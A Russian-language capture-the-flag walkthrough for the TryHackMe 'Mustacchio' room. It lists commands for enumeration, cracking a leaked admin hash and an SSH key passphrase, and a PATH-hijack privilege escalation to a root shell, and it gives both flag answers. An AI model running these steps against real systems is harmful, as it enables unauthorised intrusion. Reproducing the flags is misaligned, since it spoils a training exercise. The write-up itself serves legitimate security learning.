[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Mustacchio](https://tryhackme.com/r/room/mustacchio) 

Всего 1 заданиe:
## Задание 1
Убедитесь, что вы подключены к сети TryHackMe. Если вы не знаете, как это сделать, сначала пройдите  комнату OpenVPN .

### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sC -sV -p- <IP>
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>
# http://<IP>/custom/js/mobile.js
file users.bak
sqlite3 users.bak
# admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
hash-identifier
echo `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b` > user_hash
john user_hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt 
# admin:bulldog19
# http://<IP>:8765
XXE vulnerability
/home/barry/.ssh/id_rsa
ssh2john id_rsa > id_rsa.john
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
chmod 600 id_rsa
ssh -i id_rsa barry@<IP>
cat user.txt
```
```commandline
62d77a4d5f97d47c5aa38b3b2651b831
```
Что такое корневой флаг?
```commandline
find / -user root -perm -4000 — exec ls -ldb {} \;
file live_log
strings live_log
```
`tail -f /var/log/nginx/accessl.log` показывает нам, что исполняемый файл запущен без полного пути (например, не 
использует /usr/bin/curl или /usr/bin/uname). Как это использовать?
```commandline
1. Создайте новый каталог в папке /tmp/, например:
mkdir /tmp/shell
2. Перейдите в эту папку:
cd /tmp/shell
3. Измените папку /usr/bin на /tmp/shell
export PATH=/tmp/shell:$PATH
4. Создайте файл tail, введите эти две команды:
echo '#!/bin/bash' > tail
echo '/bin/bash' >> tail
5. Измените права доступа для файла tail
chmod +x tail
6. Вернитесь в live_log и запустите файл
./live_log

cat /root/root.txt
```
```commandline
3223581420d906c4dd1a5f9b530393a5
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)